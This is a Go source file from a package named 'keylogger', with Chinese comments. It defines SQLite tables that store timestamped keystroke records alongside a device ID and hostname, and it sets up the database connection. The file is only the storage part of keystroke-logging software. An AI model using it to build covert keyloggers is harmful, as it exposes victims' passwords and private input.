package keylogger

import (
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
	"time"
)

// device_info表
type DeviceInfo struct {
	//gorm.Model
	//ID         uint   `gorm:"-;primary_key;AUTO_INCREMENT"`
	DeviceID   string `gorm:"primaryKey"`
	DeviceName string
}

// data表
type Data struct {
	//gorm.Model
	Timestamp       int64 `gorm:"primaryKey"`
	KeystrokeRecord string
}

// 连接到sqlite3数据库
func (this *Keylogger) sqlite3Conn(path string) {
	var err error
	this.db, err = gorm.Open(sqlite.Open(path), &gorm.Config{})
	if err != nil {
		panic(err)
	}
}

//// 创建sqlite3数据库
//func (this *Keylogger) initDeviceInfo() {
//	// 创建数据库文件
//	//this.sqlite3Conn(this.dbPath)
//
//	//// 创建表
//	//this.db.AutoMigrate(&Data{})
//	//this.db.AutoMigrate(&DeviceInfo{})
//
//	var err error
//	this.deviceID = uuid.NewString()
//	this.deviceName, err = os.Hostname()
//	if err != nil {
//		log.Println(err.Error())
//	}
//
//	this.db.Create(&DeviceInfo{DeviceID: this.deviceID, DeviceName: this.deviceName})
//}

// 初始化数据库，创建数据库或从数据库读取信息
func (this *Keylogger) initDB() {
	// 数据库文件存在，连接数据库
	this.sqlite3Conn(this.dbPath)

	var deviceInfo DeviceInfo

	for {
		if result := this.db.First(&deviceInfo); result.RowsAffected != 0 {
			break
		}
		time.Sleep(1 * time.Second)
	}

	this.deviceID = deviceInfo.DeviceID
	this.deviceName = deviceInfo.DeviceName
}
